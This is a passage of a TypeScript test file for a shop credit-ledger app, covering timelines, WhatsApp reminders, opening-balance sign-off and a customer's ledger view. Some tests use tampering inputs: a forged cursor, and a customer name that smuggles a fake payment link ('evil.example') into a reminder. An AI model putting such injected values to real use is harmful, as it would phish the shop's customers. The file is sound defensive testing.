      seen.push(...res.body.items.map((row: { id: string }) => row.id));
      cursor = res.body.nextCursor;
      pages++;
    } while (cursor && pages < 10);
    expect(new Set(seen).size).toBe(seen.length);
    // Ten rows made here, and the opening entry.
    expect(seen).toHaveLength(11);
  });
  it('refuses a tampered cursor, or one from another customer', async () => {
    await signed('ramesh', 500000);
    await paid('ramesh', 100);
    const first = await timeline('papa', 'ramesh', '?limit=1').expect(200);
    await timeline('papa', 'suresh', `?limit=1&cursor=${first.body.nextCursor}`).expect(400);
    await timeline('papa', 'ramesh', '?cursor=garbage').expect(400);
    const forged = Buffer.from(
      JSON.stringify({ scope: 'wrong', value: 'not-a-date', id: 'x' }),
    ).toString('base64url');
    await timeline('papa', 'ramesh', `?cursor=${forged}`).expect(400);
    await timeline('papa', 'ramesh', '?limit=100000').expect(400);
  });
  it('a shop’s people see that shop’s orders and calls, and the firm’s balance and notes', async () => {
    const atA = await creditOrder('+919000006001', { locationId: MAIN });
    await move(atA.id, 'PREPARING');
    await move(atA.id, 'OUT_FOR_DELIVERY');
    const callA = await made('manager', 'ramesh');
    const callB = await made('managerb', 'ramesh');
    await post('papa', 'admin/customers/ramesh/notes', { body: 'Sabke liye' }).expect(201);
    const manager = (await timeline('manager').expect(200)).body;
    const managerB = (await timeline('managerb').expect(200)).body;
    const ids = (body: { items: { id: string }[] }) => body.items.map((row) => row.id);
    expect(ids(manager)).toContain(atA.id);
    expect(ids(manager)).toContain(callA.id);
    expect(ids(manager)).not.toContain(callB.id);
    expect(ids(managerB)).not.toContain(atA.id);
    expect(ids(managerB)).toContain(callB.id);
    expect(ids(managerB)).not.toContain(callA.id);
    expect(kinds(managerB)).toContain('NOTE');
    const sale = managerB.items.find((row: { kind: string }) => row.kind === 'KHATA');
    expect(sale.orderNumber).toBeNull();
    expect(JSON.stringify(managerB)).not.toContain(atA.number);
    const owner = (await timeline('papa').expect(200)).body;
    expect(ids(owner)).toEqual(expect.arrayContaining([atA.id, callA.id, callB.id]));
    expect(owner.items.find((row: { kind: string }) => row.kind === 'KHATA').orderNumber).toBe(
      atA.number,
    );
    // The older ledger route follows the same rule: the balance is the firm's, the order is the shop's.
    const ledger = (who: string) => get(who, 'admin/customers/ramesh/khata').expect(200);
    const seenAtB = (await ledger('managerb')).body;
    const posted = (body: { entries: { items: { kind: string }[] } }) =>
      body.entries.items.find((row) => row.kind === 'SALE_ON_CREDIT') as unknown as {
        note: string;
        orderId: string | null;
      };
    expect(seenAtB.balancePaise).toBeGreaterThan(0);
    expect(posted(seenAtB)).toMatchObject({ note: '', orderId: null });
    expect(JSON.stringify(seenAtB)).not.toContain(atA.number);
    expect(posted((await ledger('manager')).body).note).toContain(atA.number);
    expect(posted((await ledger('papa')).body).orderId).toBe(atA.id);
    expect(posted((await ledger('accountant')).body).note).toContain(atA.number);
  });
  it.each(outsiders)('%s is refused', async (who) => {
    await timeline(who).expect(403);
  });
  it('not signed in is refused', async () => {
    await request(server).get('/api/v1/admin/customers/ramesh/timeline').expect(401);
  });
  it('staff and unknown people are not customers', async () => {
    await timeline('papa', 'chacha').expect(404);
    await timeline('papa', 'nobody').expect(404);
  });
  it('reading it writes nothing', async () => {
    const before = await db.auditLog.count();
    await timeline('papa').expect(200);
    expect(await db.auditLog.count()).toBe(before);
  });
});

describe('one-tap reminders', () => {
  it('nothing goes out before sign-off, whatever the balance says', async () => {
    await db.user.update({ where: { id: 'ramesh' }, data: { khataBalancePaise: 50000 } });
    const res = await remind('papa', 'ramesh').expect(409);
    expect(res.body.error.code).toBe('REMINDER_NOT_SIGNED');
    expect(await db.customerContact.count()).toBe(0);
    const { body } = await get('papa', 'admin/customers/ramesh/reminder').expect(200);
    expect(body).toMatchObject({ blocked: 'NOT_SIGNED', allowed: false, url: null, text: null });
  });
  it('gives a link with the name and the balance now, records it, and sends nothing', async () => {
    await signed('ramesh', 1250000);
    await paid('ramesh', 250000);
    const before = await db.outboundMessage.count();
    const { body } = await remind('papa', 'ramesh').expect(201);
    expect(body.text).toContain('Ramesh Kumar ji');
    expect(body.text).toContain('₹10,000');
    expect(body.url.startsWith('https://wa.me/919000006001?text=')).toBe(true);
    expect(decodeURIComponent(body.url.split('?text=')[1])).toBe(body.text);
    expect(await db.outboundMessage.count()).toBe(before);
    expect(await db.notification.count({ where: { userId: 'ramesh' } })).toBe(0);
    expect(await db.customerContact.findMany({ where: { customerId: 'ramesh' } })).toMatchObject([
      { kind: 'REMINDER', channel: 'WHATSAPP', actorId: 'papa' },
    ]);
    expect(await db.auditLog.count({ where: { event: 'CUSTOMER_REMINDED' } })).toBe(1);
  });
  it('the words and the amount cannot come from the browser', async () => {
    await signed('ramesh', 1000);
    for (const extra of [{ text: 'Pay ₹1' }, { balancePaise: 1 }, { phone: '+919111111111' }])
      await remind('papa', 'ramesh', extra).expect(400);
  });
  it('a retry gives the same record, and a second person the same day must mean it', async () => {
    await signed('ramesh', 1000);
    const key = randomUUID();
    const first = await remind('papa', 'ramesh', { idempotencyKey: key }).expect(201);
    const second = await remind('papa', 'ramesh', { idempotencyKey: key }).expect(201);
    expect(second.body.id).toBe(first.body.id);
    expect(await db.customerContact.count()).toBe(1);
    const again = await remind('chacha', 'ramesh').expect(409);
    expect(again.body.error.code).toBe('REMINDED_TODAY');
    expect(await db.customerContact.count()).toBe(1);
    await remind('chacha', 'ramesh', { again: true }).expect(201);
    expect(await db.customerContact.count()).toBe(2);
  });
  it('yesterday’s reminder does not hold back today’s, and shows when it was', async () => {
    await signed('ramesh', 1000);
    await db.customerContact.create({
      data: {
        customerId: 'ramesh',
        actorId: 'papa',
        channel: 'WHATSAPP',
        kind: 'REMINDER',
        purpose: 'x',
        createdAt: new Date(Date.now() - 2 * 86400000),
      },
    });
    const { body } = await get('papa', 'admin/customers/ramesh/reminder').expect(200);
    expect(body.remindedToday).toBe(false);
    expect(body.lastRemindedAt).toBeTruthy();
    await remind('papa', 'ramesh').expect(201);
  });
  it('a burst of taps still makes one reminder a day', async () => {
    await signed('ramesh', 1000);
    await Promise.all(Array.from({ length: 5 }, () => remind('papa', 'ramesh')));
    expect(await db.customerContact.count({ where: { kind: 'REMINDER' } })).toBe(1);
  });
  it('a key used for a payment reminder cannot be replayed as another kind', async () => {
    await signed('ramesh', 1000);
    const key = randomUUID();
    await remind('papa', 'ramesh', { idempotencyKey: key }).expect(201);
    await remind('papa', 'ramesh', { idempotencyKey: key, purpose: 'QUIET' }).expect(409);
  });
  it('nothing when nothing is owed, or the customer has an advance', async () => {
    await signed('ramesh', 1000);
    await paid('ramesh', 1000);
    expect((await remind('papa', 'ramesh').expect(409)).body.error.code).toBe(
      'REMINDER_NO_BALANCE',
    );
    await paid('ramesh', 500);
    expect((await remind('papa', 'ramesh').expect(409)).body.error.code).toBe(
      'REMINDER_NO_BALANCE',
    );
  });
  it('a stop request is honoured at once, even for a retry of an old tap', async () => {
    await signed('ramesh', 1000);
    const key = randomUUID();
    await remind('cashier', 'ramesh', { idempotencyKey: key }).expect(201);
    await put('cashier', 'admin/customers/ramesh/reminder-stop', { stopped: true }).expect(200);
    const res = await remind('cashier', 'ramesh', { idempotencyKey: key }).expect(409);
    expect(res.body.error.code).toBe('REMINDER_STOPPED');
    const { body } = await get('papa', 'admin/customers/ramesh/reminder').expect(200);
    expect(body).toMatchObject({ blocked: 'STOPPED', url: null, allowed: false });
    expect(JSON.stringify(body)).not.toContain('wa.me');
    await made('papa', 'ramesh');
    expect((await due('papa')).items[0]!.reminderBlocked).toBe('STOPPED');
  });
  it('anyone who reminds can write down a stop; only an owner can take it back', async () => {
    await signed('ramesh', 1000);
    await put('cashierb', 'admin/customers/ramesh/reminder-stop', { stopped: true }).expect(200);
    await put('cashier', 'admin/customers/ramesh/reminder-stop', { stopped: false }).expect(403);
    await put('manager', 'admin/customers/ramesh/reminder-stop', { stopped: false }).expect(403);
    await remind('papa', 'ramesh').expect(409);
    await put('papa', 'admin/customers/ramesh/reminder-stop', { stopped: false }).expect(200);
    await remind('papa', 'ramesh').expect(201);
    expect(await db.auditLog.count({ where: { event: 'REMINDERS_STOPPED' } })).toBe(1);
    expect(await db.auditLog.count({ where: { event: 'REMINDERS_RESUMED' } })).toBe(1);
  });
  it('writing the same stop twice logs it once', async () => {
    await put('papa', 'admin/customers/ramesh/reminder-stop', { stopped: true }).expect(200);
    await put('papa', 'admin/customers/ramesh/reminder-stop', { stopped: true }).expect(200);
    expect(await db.auditLog.count({ where: { event: 'REMINDERS_STOPPED' } })).toBe(1);
  });
  it('the accountant and the outsiders cannot write down a stop', async () => {
    for (const who of ['accountant', ...outsiders])
      await put(who, 'admin/customers/suresh/reminder-stop', { stopped: true }).expect(403);
  });
  it('a customer’s own word in the app stops it, and only for themselves', async () => {
    await signed('ramesh', 1000);
    await put('ramesh', 'me/reminders', { stopped: true }).expect(200);
    expect((await remind('papa', 'ramesh').expect(409)).body.error.code).toBe('REMINDER_STOPPED');
    await signed('suresh', 1000);
    await remind('papa', 'suresh').expect(201);
    await put('ramesh', 'me/reminders', { stopped: true, customerId: 'suresh' }).expect(400);
  });
  it('STOP typed on the shop’s WhatsApp stops it too, by account or by number', async () => {
    await signed('ramesh', 1000);
    await signed('suresh', 1000);
    await db.waThread.create({
      data: { contactKey: 'a', userId: 'ramesh', aiMode: 'OPTED_OUT' },
    });
    await db.waThread.create({
      data: { contactKey: 'b', phone: '+919000006002', aiMode: 'OPTED_OUT' },
    });
    await remind('papa', 'ramesh').expect(409);
    await remind('papa', 'suresh').expect(409);
    await signed('mohan', 1000);
    await db.waThread.create({ data: { contactKey: 'c', phone: '+919000006003' } });
    await remind('papa', 'mohan').expect(201);
  });
  it('a closed account, staff, or the walk-in row gets no reminder', async () => {
    await db.user.create({ data: { id: 'walkin', phone: 'walk-in:store', name: 'Walk-in' } });
    await remind('papa', 'walkin').expect(404);
    await remind('papa', 'chacha').expect(404);
    await remind('papa', 'nobody').expect(404);
  });
  it('a name cannot turn the shop’s message into someone else’s link', async () => {
    await signed('ramesh', 1000);
    await db.user.update({
      where: { id: 'ramesh' },
      data: { name: 'Ram\nhttps://evil.example/pay *abhi* ' },
    });
    const { body } = await remind('papa', 'ramesh').expect(201);
    expect(body.text).not.toMatch(/https?:|\n|\*/);
  });
  describe('who may hold the number', () => {
    it('the accountant sees the words and a masked number, never the link', async () => {
      await signed('ramesh', 1000);
      const { body } = await get('accountant', 'admin/customers/ramesh/reminder').expect(200);
      expect(body).toMatchObject({
        phone: null,
        phoneMasked: '+91XXXXXXX001',
        url: null,
        allowed: false,
      });
      expect(JSON.stringify(body)).not.toContain('9000006001');
      await remind('accountant', 'ramesh').expect(403);
    });
    it('a cashier and a manager at the shop that gave the credit get the link', async () => {
      await signed('ramesh', 1000, MAIN);
      for (const who of ['cashier', 'manager']) {
        const { body } = await get(who, 'admin/customers/ramesh/reminder').expect(200);
        expect(body.allowed).toBe(true);
        expect(body.url).toContain('wa.me/919000006001');
      }
      await remind('cashier', 'ramesh').expect(201);
    });
    it('another shop gets no link and no reminder for a balance that is not theirs', async () => {
      await signed('ramesh', 1000, MAIN);
      for (const who of ['cashierb', 'managerb']) {
        const { body } = await get(who, 'admin/customers/ramesh/reminder').expect(200);
        expect(body).toMatchObject({ allowed: false, url: null });
        await remind(who, 'ramesh').expect(403);
      }
    });
    it('their own shop’s call lets them, and someone else’s does not', async () => {
      await signed('ramesh', 1000, MAIN);
      const mine = await made('cashierb', 'ramesh');
      await remind('cashierb', 'ramesh', { followUpId: mine.id }).expect(201);
      const theirs = await made('cashier', 'ramesh');
      await remind('cashierb', 'ramesh', { followUpId: theirs.id, again: true }).expect(403);
      const other = await made('cashierb', 'suresh');
      const res = await remind('cashierb', 'ramesh', { followUpId: other.id, again: true });
      expect(res.status).toBe(404);
    });
    it('an owner reaches anyone, even with no shop on record', async () => {
      await signed('mohan', 0);
      const res = await remind('papa', 'mohan', { purpose: 'QUIET' });
      expect(res.status).toBe(201);
    });
    it.each(outsiders)('%s is refused both ways', async (who) => {
      await get(who, 'admin/customers/suresh/reminder').expect(403);
      await remind(who, 'suresh').expect(403);
    });
  });
  it('a quiet customer’s message needs no signature and names no money', async () => {
    await db.user.update({ where: { id: 'ramesh' }, data: { khataBalancePaise: 99900 } });
    const { body } = await remind('papa', 'ramesh', { purpose: 'QUIET' }).expect(201);
    expect(body.text).not.toMatch(/₹|baaki/);
    expect(await db.customerContact.count({ where: { kind: 'QUIET' } })).toBe(1);
    await put('papa', 'admin/customers/ramesh/reminder-stop', { stopped: true });
    await remind('papa', 'ramesh', { purpose: 'QUIET', again: true }).expect(409);
  });
  it('a bad purpose is refused', async () => {
    await get('papa', 'admin/customers/ramesh/reminder?purpose=SPAM').expect(400);
    await remind('papa', 'ramesh', { purpose: 'SPAM' }).expect(400);
  });
});

describe('the opening sheet', () => {
  const draftBody = (customerId = 'ramesh', paperPaise = 50000, extra: object = {}) => ({
    customerId,
    asOf: today(),
    paperPaise,
    ...extra,
  });
  const approve = (who: string, rows: object[]) =>
    post(who, 'admin/khata/opening-sheet/approve', { rows });
  const row = (customerId: string, version: number, chosenPaise: number, extra: object = {}) => ({
    customerId,
    draftVersion: version,
    chosenPaise,
    ...extra,
  });

  it('the accountant types and only an owner signs', async () => {
    const draft = await post('accountant', 'admin/khata/opening-sheet', draftBody()).expect(201);
    expect(draft.body).toMatchObject({ paperPaise: 50000, version: 1, enteredById: 'accountant' });
    for (const who of ['accountant', 'manager', 'cashier', ...outsiders])
      await approve(who, [row('ramesh', 1, 50000)]).expect(403);
    expect(await balance('ramesh')).toBe(0);
    const { body } = await approve('papa', [row('ramesh', 1, 50000)]).expect(201);
    expect(body).toMatchObject({ signed: 1, refused: 0 });
    expect(await balance('ramesh')).toBe(50000);
    expect(
      await db.khataSignoff.findFirstOrThrow({ where: { customerId: 'ramesh' } }),
    ).toMatchObject({
      paperPaise: 50000,
      chosenPaise: 50000,
      enteredById: 'accountant',
      approvedById: 'papa',
      firmId: 'firm_main',
    });
    const [entry] = await db.customerLedgerEntry.findMany({ where: { customerId: 'ramesh' } });
    expect(entry).toMatchObject({ kind: 'OPENING_BALANCE', amountPaise: 50000, actorId: 'papa' });
    for (const event of ['KHATA_OPENING_DRAFTED', 'KHATA_SIGNED_OFF', 'KHATA_OPENING_BALANCE'])
      expect(await db.auditLog.count({ where: { event } })).toBe(1);
  });
  it('a manager and a cashier cannot type or read the sheet', async () => {
    for (const who of ['manager', 'cashier', ...outsiders]) {
      await post(who, 'admin/khata/opening-sheet', draftBody()).expect(403);
      await get(who, 'admin/khata/opening-sheet').expect(403);
    }
  });
  it('a browser cannot send the Tally figure', async () => {
    await post(
      'papa',
      'admin/khata/opening-sheet',
      draftBody('ramesh', 100, { tallyPaise: 5 }),
    ).expect(400);
  });
  it('one bad row leaves the others signed', async () => {
    await post('papa', 'admin/khata/opening-sheet', draftBody('ramesh', 100)).expect(201);
    await post('papa', 'admin/khata/opening-sheet', draftBody('suresh', 200)).expect(201);
    const { body } = await approve('papa', [
      row('ramesh', 1, 100),
      row('mohan', 1, 300),
      row('suresh', 9, 200),
      row('nobody', 1, 400),
    ]).expect(201);
    expect(body.signed).toBe(1);
    expect(body.refused).toBe(3);
    expect(body.results.map((item: { code?: string }) => item.code ?? 'OK')).toEqual([
      'OK',
      'OPENING_NOT_DRAFTED',
      'DRAFT_CHANGED',
      'CUSTOMER_NOT_FOUND',
    ]);
    expect(await balance('suresh')).toBe(0);
  });
  it('signing twice writes once, and a different figure afterwards is refused', async () => {
    await post('papa', 'admin/khata/opening-sheet', draftBody()).expect(201);
    await approve('papa', [row('ramesh', 1, 50000)]).expect(201);
    const again = await approve('chacha', [row('ramesh', 1, 50000)]).expect(201);
    expect(again.body.already).toBe(1);
    expect(await balance('ramesh')).toBe(50000);
    expect(await db.khataSignoff.count()).toBe(1);
    const other = await approve('papa', [row('ramesh', 1, 70000, { reason: 'Galti thi' })]).expect(
      201,
    );
    expect(other.body.results[0].code).toBe('ALREADY_SIGNED');
    expect(await balance('ramesh')).toBe(50000);
  });
  it('both owners signing at once writes one opening', async () => {
    await post('papa', 'admin/khata/opening-sheet', draftBody()).expect(201);
    await Promise.all([
      approve('papa', [row('ramesh', 1, 50000)]),
      approve('chacha', [row('ramesh', 1, 50000)]),
      approve('papa', [row('ramesh', 1, 50000)]),
    ]);
    expect(await db.khataSignoff.count()).toBe(1);
    expect(await db.customerLedgerEntry.count({ where: { customerId: 'ramesh' } })).toBe(1);
    expect(await balance('ramesh')).toBe(50000);
  });
  it('a figure changed after the owner looked is not the one they sign', async () => {
    await post('accountant', 'admin/khata/opening-sheet', draftBody('ramesh', 100)).expect(201);
    const edited = await post(
      'accountant',
      'admin/khata/opening-sheet',
      draftBody('ramesh', 900),
    ).expect(201);
    expect(edited.body.version).toBe(2);
    const { body } = await approve('papa', [row('ramesh', 1, 100)]).expect(201);
    expect(body.results[0]).toMatchObject({
      code: 'DRAFT_CHANGED',
      details: { version: 2, paperPaise: 900 },
    });
    expect(await balance('ramesh')).toBe(0);
  });
  it('sending the same figures again keeps the version an owner is looking at', async () => {
    await post('accountant', 'admin/khata/opening-sheet', draftBody()).expect(201);
    const same = await post('accountant', 'admin/khata/opening-sheet', draftBody()).expect(201);
    expect(same.body.version).toBe(1);
    expect(await db.auditLog.count({ where: { event: 'KHATA_OPENING_DRAFTED' } })).toBe(1);
  });
  it('a figure other than paper needs a reason', async () => {
    await post('papa', 'admin/khata/opening-sheet', draftBody()).expect(201);
    const { body } = await approve('papa', [row('ramesh', 1, 40000)]).expect(201);
    expect(body.results[0].code).toBe('REASON_NEEDED');
    const ok = await approve('papa', [
      row('ramesh', 1, 40000, { reason: 'Tally wala sahi' }),
    ]).expect(201);
    expect(ok.body.signed).toBe(1);
    expect(await balance('ramesh')).toBe(40000);
  });
  it('starting at nothing is a signature with no entry', async () => {
    await post('papa', 'admin/khata/opening-sheet', draftBody('ramesh', 0)).expect(201);
    await approve('papa', [row('ramesh', 1, 0)]).expect(201);
    expect(await db.customerLedgerEntry.count({ where: { customerId: 'ramesh' } })).toBe(0);
    const signoff = await db.khataSignoff.findFirstOrThrow({ where: { customerId: 'ramesh' } });
    expect(signoff.ledgerEntryId).toBeNull();
    await patch('papa', 'admin/customers/ramesh', {
      creditAllowed: true,
      creditLimitPaise: 100000,
    }).expect(200);
  });
  it('an advance can be the opening', async () => {
    await post('papa', 'admin/khata/opening-sheet', draftBody('ramesh', -5000)).expect(201);
    await approve('papa', [row('ramesh', 1, -5000)]).expect(201);
    expect(await balance('ramesh')).toBe(-5000);
  });
  it('refuses a row while an earlier live entry would count the debt twice', async () => {
    const earlier = await post('papa', 'admin/customers/ramesh/khata/adjust', {
      amountPaise: 3000,
      note: 'Purana',
      occurredAt: addDays(today(), -10),
      idempotencyKey: randomUUID(),
    }).expect(201);
    await post('papa', 'admin/khata/opening-sheet', draftBody()).expect(201);
    const { body } = await approve('papa', [row('ramesh', 1, 50000)]).expect(201);
    expect(body.results[0]).toMatchObject({
      code: 'ENTRIES_BEFORE_CUTOFF',
      details: { entries: 1 },
    });
    expect(await balance('ramesh')).toBe(3000);
    await post('papa', `admin/customers/ramesh/khata/reverse/${earlier.body.id}`, {
      note: 'Sheet se aayega',
      idempotencyKey: randomUUID(),
    }).expect(201);
    expect((await approve('papa', [row('ramesh', 1, 50000)]).expect(201)).body.signed).toBe(1);
    expect(await balance('ramesh')).toBe(50000);
  });
  it('money taken after the cut-off but before signing stays counted', async () => {
    const asOf = addDays(today(), -5);
    await paid('ramesh', 1000);
    await post('papa', 'admin/khata/opening-sheet', draftBody('ramesh', 50000, { asOf })).expect(
      201,
    );
    await approve('papa', [row('ramesh', 1, 50000)]).expect(201);
    expect(await balance('ramesh')).toBe(49000);
  });
  it('cannot be typed again once signed', async () => {
    await post('papa', 'admin/khata/opening-sheet', draftBody()).expect(201);
    await approve('papa', [row('ramesh', 1, 50000)]).expect(201);
    const res = await post(
      'accountant',
      'admin/khata/opening-sheet',
      draftBody('ramesh', 1),
    ).expect(409);
    expect(res.body.error.code).toBe('ALREADY_SIGNED');
  });
  it('refuses a future date, a made-up date, a closed shop and a stranger', async () => {
    await post(
      'papa',
      'admin/khata/opening-sheet',
      draftBody('ramesh', 1, { asOf: addDays(today(), 1) }),
    ).expect(400);
    await post(
      'papa',
      'admin/khata/opening-sheet',
      draftBody('ramesh', 1, { asOf: '2026-02-31' }),
    ).expect(400);
    await post(
      'papa',
      'admin/khata/opening-sheet',
      draftBody('ramesh', 1, { locationId: 'no' }),
    ).expect(400);
    await post('papa', 'admin/khata/opening-sheet', draftBody('papa', 1)).expect(404);
    await post('papa', 'admin/khata/opening-sheet', draftBody('nobody', 1)).expect(404);
    await post('papa', 'admin/khata/opening-sheet', draftBody('ramesh', 3_000_000_000)).expect(400);
  });
  it('a balance past what the ledger holds is refused for that row', async () => {
    await db.user.update({ where: { id: 'ramesh' }, data: { khataBalancePaise: 1_999_999_000 } });
    await post('papa', 'admin/khata/opening-sheet', draftBody('ramesh', 2_000_000_000)).expect(201);
    const { body } = await approve('papa', [row('ramesh', 1, 2_000_000_000)]).expect(201);
    expect(body.results[0].code).toBe('KHATA_OVERFLOW');
    expect(await db.khataSignoff.count()).toBe(0);
  });
  it('a signature can never be changed or removed, from the app or the database', async () => {
    await post('papa', 'admin/khata/opening-sheet', draftBody()).expect(201);
    await approve('papa', [row('ramesh', 1, 50000)]).expect(201);
    await expect(
      db.$executeRawUnsafe(`UPDATE "KhataSignoff" SET "chosenPaise" = 1`),
    ).rejects.toThrow();
    await expect(db.$executeRawUnsafe(`DELETE FROM "KhataSignoff"`)).rejects.toThrow();
  });
  it('a wrong signature is corrected by a visible entry, not by an edit', async () => {
    await post('papa', 'admin/khata/opening-sheet', draftBody()).expect(201);
    await approve('papa', [row('ramesh', 1, 50000)]).expect(201);
    await post('papa', 'admin/customers/ramesh/khata/adjust', {
      amountPaise: -7000,
      note: 'Sheet mein galti',
      idempotencyKey: randomUUID(),
    }).expect(201);
    expect(await balance('ramesh')).toBe(43000);
    expect(await db.customerLedgerEntry.count({ where: { customerId: 'ramesh' } })).toBe(2);
    expect((await db.khataSignoff.findFirstOrThrow()).chosenPaise).toBe(50000);
  });
  it('nothing can be slipped in before the signed date', async () => {
    const asOf = addDays(today(), -5);
    await post('papa', 'admin/khata/opening-sheet', draftBody('ramesh', 1000, { asOf })).expect(
      201,
    );
    await approve('papa', [row('ramesh', 1, 1000)]).expect(201);
    const body = {
      amountPaise: 500,
      note: 'Pichhli tareekh',
      occurredAt: addDays(today(), -6),
    };
    const adjust = await post('papa', 'admin/customers/ramesh/khata/adjust', {
      ...body,
      idempotencyKey: randomUUID(),
    }).expect(409);
    expect(adjust.body.error.code).toBe('BEFORE_SIGNOFF');
    await post('papa', 'admin/customers/ramesh/khata/payment', {
      ...body,
      channel: 'CASH',
      idempotencyKey: randomUUID(),
    }).expect(409);
    await post('papa', 'admin/customers/ramesh/khata/adjust', {
      ...body,
      occurredAt: asOf,
      idempotencyKey: randomUUID(),
    }).expect(201);
  });
  it('an ordinary first entry no longer pretends to be an opening balance', async () => {
    await post('papa', 'admin/customers/ramesh/khata/adjust', {
      amountPaise: 500,
      note: 'Pehli entry',
      idempotencyKey: randomUUID(),
    }).expect(201);
    expect(
      (await db.customerLedgerEntry.findFirstOrThrow({ where: { customerId: 'ramesh' } })).kind,
    ).toBe('ADJUSTMENT');
  });
  it('credit cannot be turned on before sign-off, and the limit rule still holds after', async () => {
    const before = await patch('papa', 'admin/customers/ramesh', {
      creditAllowed: true,
      creditLimitPaise: 100000,
    }).expect(409);
    expect(before.body.error.code).toBe('OPENING_NOT_SIGNED');
    await signed('ramesh', 1000);
    await patch('papa', 'admin/customers/ramesh', { creditAllowed: true }).expect(400);
    await patch('papa', 'admin/customers/ramesh', {
      creditAllowed: true,
      creditLimitPaise: 100000,
    }).expect(200);
  });
  it('someone who already has credit can still be edited without a signature', async () => {
    await db.user.update({
      where: { id: 'ramesh' },
      data: { creditAllowed: true, creditLimitPaise: 100 },
    });
    await patch('papa', 'admin/customers/ramesh', {
      creditLimitPaise: 200,
      area: 'Boring Road',
    }).expect(200);
    await patch('papa', 'admin/customers/ramesh', { creditAllowed: false }).expect(200);
  });
  it('an opening counts as old debt on the age chart and in the overdue list', async () => {
    await signed('ramesh', 50000);
    const age = (await get('papa', 'admin/reports/udhaar-age').expect(200)).body;
    expect(age.steps.find((row: { step: string }) => row.step === '90+').paise).toBe(50000);
    const summary = (await get('papa', 'admin/khata/summary').expect(200)).body;
    expect(summary.overdue30d[0]).toMatchObject({ id: 'ramesh', overduePaise: 50000 });
  });
  describe('the list', () => {
    it('shows who has history or a started row, biggest first, with counts', async () => {
      await db.user.update({ where: { id: 'ramesh' }, data: { khataBalancePaise: 100 } });
      await post('papa', 'admin/customers/ramesh/khata/adjust', {
        amountPaise: 900,
        note: 'x',
        idempotencyKey: randomUUID(),
      }).expect(201);
      await post('papa', 'admin/khata/opening-sheet', draftBody('suresh', 7)).expect(201);
      const { body } = await get('papa', 'admin/khata/opening-sheet').expect(200);
      expect(body.items.map((row: { id: string }) => row.id)).toEqual(['ramesh', 'suresh']);
      expect(body).toMatchObject({ pending: 2, signed: 0 });
      expect(body.items[1].draft).toMatchObject({ paperPaise: 7, version: 1 });
    });
    it('search finds anyone, so a new row can be started', async () => {
      const { body } = await get('papa', 'admin/khata/opening-sheet?q=mohan').expect(200);
      expect(body.items.map((row: { id: string }) => row.id)).toEqual(['mohan']);
    });
    it('signed rows move to their own tab', async () => {
      await signed('ramesh', 1000);
      expect((await get('papa', 'admin/khata/opening-sheet').expect(200)).body.items).toEqual([]);
      const { body } = await get('papa', 'admin/khata/opening-sheet?status=signed').expect(200);
      expect(body.items[0]).toMatchObject({ id: 'ramesh', signoff: { chosenPaise: 1000 } });
    });
    it('the accountant’s sheet has no numbers, and part of one finds nobody', async () => {
      await post('accountant', 'admin/khata/opening-sheet', draftBody()).expect(201);
      const { body } = await get('accountant', 'admin/khata/opening-sheet').expect(200);
      expect(body.items[0]).toMatchObject({ phone: null, phoneMasked: '+91XXXXXXX001' });
      expect(JSON.stringify(body)).not.toContain('9000006001');
      const part = (await get('accountant', 'admin/khata/opening-sheet?q=900000').expect(200)).body;
      expect(part.items).toEqual([]);
      const whole = await get(
        'accountant',
        `admin/khata/opening-sheet?q=${encodeURIComponent('+919000006001')}`,
      ).expect(200);
      expect(whole.body.items.map((row: { id: string }) => row.id)).toEqual(['ramesh']);
      const owner = (await get('papa', 'admin/khata/opening-sheet?q=900000').expect(200)).body;
      expect(owner.items.length).toBeGreaterThan(0);
    });
    it('keeps Tally’s figure beside paper, from the server, and signs what was chosen', async () => {
      await db.khataRecon.create({
        data: {
          customerId: 'ramesh',
          firmId: '',
          appPaise: 0,
          tallyPaise: 45000n,
          differencePaise: -45000n,
          unexplainedPaise: 0n,
          tallyAsOf: new Date(),
          computedAt: new Date(),
        },
      });
      const draft = await post('accountant', 'admin/khata/opening-sheet', draftBody()).expect(201);
      expect(draft.body).toMatchObject({ paperPaise: 50000, tallyPaise: '45000' });
      const { body } = await get('accountant', 'admin/khata/opening-sheet').expect(200);
      expect(body.items[0]).toMatchObject({ tallyPaise: '45000' });
      await approve('papa', [row('ramesh', 1, 45000, { reason: 'Tally wala sahi' })]).expect(201);
      expect(await db.khataSignoff.findFirstOrThrow()).toMatchObject({
        paperPaise: 50000,
        tallyPaise: 45000n,
        chosenPaise: 45000,
        reason: 'Tally wala sahi',
      });
    });
    it('refuses a bad filter or cursor', async () => {
      await get('papa', 'admin/khata/opening-sheet?status=nope').expect(400);
      await get('papa', 'admin/khata/opening-sheet?cursor=garbage').expect(400);
    });
  });
});

describe('a customer’s own khata', () => {
  const mine = (who = 'ramesh', query = '') => get(who, `me/khata${query}`);

  it('an unsigned customer sees nothing at all, whatever they owe', async () => {
    await post('papa', 'admin/customers/ramesh/khata/adjust', {
      amountPaise: 77700,
      note: 'Purana hisaab',
      idempotencyKey: randomUUID(),
    }).expect(201);
    const { body } = await mine().expect(200);
    expect(body).toEqual({ available: false });
  });
  it('a row still being typed shows nothing either', async () => {
    await post('accountant', 'admin/khata/opening-sheet', {
      customerId: 'ramesh',
      asOf: today(),
      paperPaise: 5000,
    }).expect(201);
    expect((await mine().expect(200)).body).toEqual({ available: false });
  });
  it('signing alone does not show it, because paper closes shop by shop', async () => {
    await signed('ramesh', 5000);
    expect((await mine().expect(200)).body).toEqual({ available: false });
  });
  it('the view needs a signature first, and only an owner can turn it on', async () => {
    const early = await put('papa', 'admin/customers/ramesh/khata-view', { on: true }).expect(409);
    expect(early.body.error.code).toBe('OPENING_NOT_SIGNED');
    await signed('ramesh', 5000);
    for (const who of ['accountant', 'manager', 'cashier', ...outsiders])
      await put(who, 'admin/customers/ramesh/khata-view', { on: true }).expect(403);
    await put('papa', 'admin/customers/ramesh/khata-view', { on: true }).expect(200);
    expect(await db.auditLog.count({ where: { event: 'KHATA_VIEW_CHANGED' } })).toBe(1);
    await put('papa', 'admin/customers/ramesh/khata-view', { on: true }).expect(200);
    expect(await db.auditLog.count({ where: { event: 'KHATA_VIEW_CHANGED' } })).toBe(1);
  });
  it('then they see their balance and entries, and nothing the shop keeps to itself', async () => {
    await db.user.update({
      where: { id: 'ramesh' },
      data: { tags: ['late-payer'], creditAllowed: true, creditLimitPaise: 987654 },
    });
    await signed('ramesh', 5000);
    await paid('ramesh', 1000);
    await post('papa', 'admin/customers/ramesh/notes', { body: 'Jhagda karta hai' }).expect(201);
    await put('papa', 'admin/customers/ramesh/khata-view', { on: true }).expect(200);
    const { body } = await mine().expect(200);
    expect(body).toMatchObject({ available: true, balancePaise: 4000, asOf: today() });
